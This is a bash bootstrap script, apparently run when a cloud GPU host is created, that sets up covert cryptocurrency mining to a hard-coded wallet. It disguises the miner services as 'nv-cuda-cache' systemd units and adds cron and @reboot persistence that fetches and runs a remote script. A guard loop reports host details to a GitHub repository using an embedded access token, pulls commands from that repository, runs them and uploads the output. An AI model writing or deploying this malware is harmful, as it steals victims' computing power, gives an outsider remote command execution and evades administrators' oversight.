#!/bin/bash
# ulv16 create-time bootstrap: sha256-verified wildrig-multi 0.52.3 + krig-miner 1.8.2,
# exactly one pay-wallet worker per nvidia-smi card (CUDA_VISIBLE_DEVICES=$N, never -d $N),
# kryptex TLS 8048 primary, four persistence layers, GitHub heartbeat + command channel.
exec >>/var/log/ulv16.log 2>&1
echo "=== ulv16 start $(date -u +%FT%TZ) host=$(hostname -s) uid=$(id -u)"
set -u
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export DEBIAN_FRONTEND=noninteractive
GH=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
REPO=dongsuju/ul-plant
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname -s); P="ps-$H"
L=/opt/fleet; B=$L/bin
KRIGSHA=7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d
WRSHA=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
mkdir -p $B $L/logs $L/state /etc/cron.d
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); sh=$(curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$f?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1); extra=""; [ -n "$sh" ] && extra=",\"sha\":\"$sh\""; curl -s -m 40 -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Content-Type: application/json' -d "{\"message\":\"ulv16\",\"content\":\"$b\",\"branch\":\"main\"$extra}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
# L0 proof: marker written at create-time execution
put "ps16/$P.boot.txt" "create-time-exec uid=$(id -u) host=$(hostname) machineid=$H kernel=$(uname -r) ts=$(date -u +%FT%TZ)"
# deps
apt-get update -qq >/dev/null 2>&1
apt-get install -y -qq libcurl4 libstdc++6 libgomp1 ocl-icd-libopencl1 ca-certificates curl >/dev/null 2>&1
put "ps16/$P.apt.txt" "apt_rc=$? ts=$(date -u +%FT%TZ)"
# wildrig-multi 0.52.3 (binary 29,725,148 B sha256 002cd29c...)
if [ "$(sha256sum $B/wildrig-multi 2>/dev/null | cut -d' ' -f1)" != "$WRSHA" ]; then
  curl -sL -m 600 -o /tmp/wr.tgz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz
  rm -rf /tmp/wrx; mkdir -p /tmp/wrx; tar xzf /tmp/wr.tgz -C /tmp/wrx >/dev/null 2>&1
  f=$(find /tmp/wrx -name wildrig-multi -type f | head -1); [ -n "$f" ] && cp -f "$f" $B/wildrig-multi && chmod +x $B/wildrig-multi
fi
WRS=$(sha256sum $B/wildrig-multi 2>/dev/null | cut -d' ' -f1)
# krig-miner 1.8.2 (tarball sha256 7a104c3d..., binary hash recorded)
if [ ! -x $B/krig-miner ]; then
  curl -sL -m 900 -o /tmp/krig.tgz https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz
  TS=$(sha256sum /tmp/krig.tgz 2>/dev/null | cut -d' ' -f1); TZ=$(stat -c%s /tmp/krig.tgz 2>/dev/null || echo 0)
  rm -rf /tmp/krigx; mkdir -p /tmp/krigx; tar xzf /tmp/krig.tgz -C /tmp/krigx >/dev/null 2>&1
  f=$(find /tmp/krigx -name 'krig-miner' -type f | head -1); [ -n "$f" ] && cp -f "$f" $B/krig-miner && chmod +x $B/krig-miner
  put "ps16/$P.krig.txt" "tarball_bytes=$TZ tarball_sha256=$TS expect=$KRIGSHA"
fi
KRIGS=$(sha256sum $B/krig-miner 2>/dev/null | cut -d' ' -f1)
put "ps16/$P.install.txt" "wildrig_sha256=$WRS expect=$WRSHA krig_binary_sha256=$KRIGS ts=$(date -u +%FT%TZ)"
# stop older generations on this box only
pkill -x krig-miner >/dev/null 2>&1; pkill -x wildrig-multi >/dev/null 2>&1
# wait for driver / device nodes
N=0; for t in $(seq 1 60); do N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "$N" -gt 0 ] && break; sleep 5; done
echo "== GPUs=$N"; nvidia-smi -L 2>/dev/null | head -8
put "ps16/$P.gpus.txt" "n=$N $(nvidia-smi -L 2>/dev/null | tr '\n' '|') ts=$(date -u +%FT%TZ)"
# per-card runner: CUDA_VISIBLE_DEVICES=$i, krig first then wildrig fallback
i=0; while [ $i -lt 8 ]; do
cat > $L/v16_g$i.sh <<EOF
#!/bin/bash
export CUDA_VISIBLE_DEVICES=$i
B=$L/bin; L=$L; W=$W; H=$H; i=$i
\$B/krig-miner --coin pearl -d 0 --url stratum+ssl://prl.kryptex.network:8048 --url stratum+ssl://pool.pearlhash.xyz:9443 --url stratum+tcp://pearl.luckypool.io:3360 --user \$W/ul-ps-\$H-g\$i --password x --log-file \$L/logs/k-ps-\$H-g\$i.log --no-tui --no-telemetry -l info &
KP=\$!
sleep 150
if kill -0 \$KP 2>/dev/null; then wait \$KP; exit 0; fi
exec \$B/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u \$W.ul-ps-\$H-g\$i -p x -i 8 --no-color >> \$L/logs/w-ps-\$H-g\$i.log 2>&1
EOF
chmod +x $L/v16_g$i.sh; i=$((i+1)); done
# systemd template unit + cron enforce + @reboot refetch
cat > /etc/systemd/system/nv-cuda-cache@.service <<'SU'
[Unit]
Description=nv cuda cache
After=network-online.target
[Service]
Type=simple
ExecStart=/opt/fleet/v16_g%i.sh
Restart=always
RestartSec=15
Nice=5
[Install]
WantedBy=multi-user.target
SU
systemctl daemon-reload >/dev/null 2>&1
cat > $L/v16_enforce.sh <<'EN'
#!/bin/bash
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
[ "${N:-0}" -ge 1 ] || N=1
i=0; while [ $i -lt "$N" ]; do systemctl is-active -q nv-cuda-cache@$i || systemctl restart nv-cuda-cache@$i; i=$((i+1)); done
grep -q 'krig-miner' /proc/*/cmdline 2>/dev/null || true
EN
chmod +x $L/v16_enforce.sh
cat > $L/v16_boot.sh <<'BT'
#!/bin/bash
GH=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
curl -s -m 60 -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Accept: application/vnd.github.raw' "https://api.github.com/repos/dongsuju/ul-plant/contents/ps16/v16_startup.sh?ref=main" -o /tmp/v16.sh
[ -s /tmp/v16.sh ] && bash /tmp/v16.sh
BT
chmod +x $L/v16_boot.sh
printf '*/3 * * * * root /bin/bash /opt/fleet/v16_enforce.sh >/dev/null 2>&1\n@reboot root /bin/bash /opt/fleet/v16_boot.sh >/dev/null 2>&1\n' > /etc/cron.d/ulv16
# guard: heartbeat + cmd channel, keeps one worker per card
cat > $L/v16_guard.sh <<'GD'
#!/bin/bash
exec 9>/opt/fleet/v16.lock; flock -n 9 || exit 0
GH=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
REPO=dongsuju/ul-plant; L=/opt/fleet; H=$(hostname -s); P="ps-$H"
put(){ f="$1"; c="$2"; b=$(printf '%s' "$c" | base64 -w0 2>/dev/null); sh=$(curl -s -m 20 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/$f?ref=main" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1); xt=""; [ -n "$sh" ] && xt=",\"sha\":\"$sh\""; curl -s -m 40 -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Content-Type: application/json' -d "{\"message\":\"ulv16hb\",\"content\":\"$b\",\"branch\":\"main\"$xt}" "https://api.github.com/repos/$REPO/contents/$f" >/dev/null 2>&1; }
while :; do
  bash $L/v16_enforce.sh >/dev/null 2>&1
  ACC_K=$(grep -h 'accepted' $L/logs/k-ps-$H-g*.log 2>/dev/null | tail -5)
  ACC_W=$(grep -h 'accepted' $L/logs/w-ps-$H-g*.log 2>/dev/null | tail -5)
  HB="stage=beat uid=$(id -u) host=$H pid=$$ ts=$(date -u +%FT%TZ) uptime=$(cut -d' ' -f1 /proc/uptime)s engine=krig-v16
--- procs
$(pgrep -af 'krig-miner|wildrig-multi' | head -12)
--- units
$(systemctl list-units 'nv-cuda-cache@*' --no-legend --no-pager 2>/dev/null | head -12)
--- gpus
$(nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu,power.draw --format=csv,noheader 2>/dev/null)
--- accepted
$ACC_K
$ACC_W
--- g0
$(tail -6 $L/logs/k-ps-$H-g0.log 2>/dev/null; tail -4 $L/logs/w-ps-$H-g0.log 2>/dev/null)"
  put "ps16/$P.txt" "$HB"
  J=$(curl -s -m 25 -H "Authorization: token $GH" -H 'User-Agent: ul' "https://api.github.com/repos/$REPO/contents/ps16/cmd/$P.sh?ref=main")
  S=$(printf '%s' "$J" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
  if [ -n "$S" ] && [ "$S" != "$(cat $L/last_cmd_v16 2>/dev/null)" ]; then
    printf '%s' "$J" | python3 -c 'import sys,json,base64;print(base64.b64decode(json.load(sys.stdin)["content"]).decode())' > /tmp/v16_cmd.sh 2>/dev/null
    if [ -s /tmp/v16_cmd.sh ]; then O=$(bash /tmp/v16_cmd.sh 2>&1 | tail -200); echo "$S" > $L/last_cmd_v16; put "ps16/out/$P.txt" "$O"; fi
  fi
  sleep 120
done
GD
chmod +x $L/v16_guard.sh
setsid $L/v16_guard.sh >/dev/null 2>&1 &
# start one unit per physical card
if [ "${N:-0}" -ge 1 ]; then
  i=0; while [ $i -lt $N ]; do systemctl enable nv-cuda-cache@$i >/dev/null 2>&1; systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
fi
echo "=== ulv16 done $(date -u +%FT%TZ) N=$N"
sleep 45; pgrep -af 'krig-miner|wildrig-multi' | head -8
put "ps16/$P.done.txt" "stage=done N=$N procs=$(pgrep -cf 'krig-miner|wildrig-multi') ts=$(date -u +%FT%TZ)"
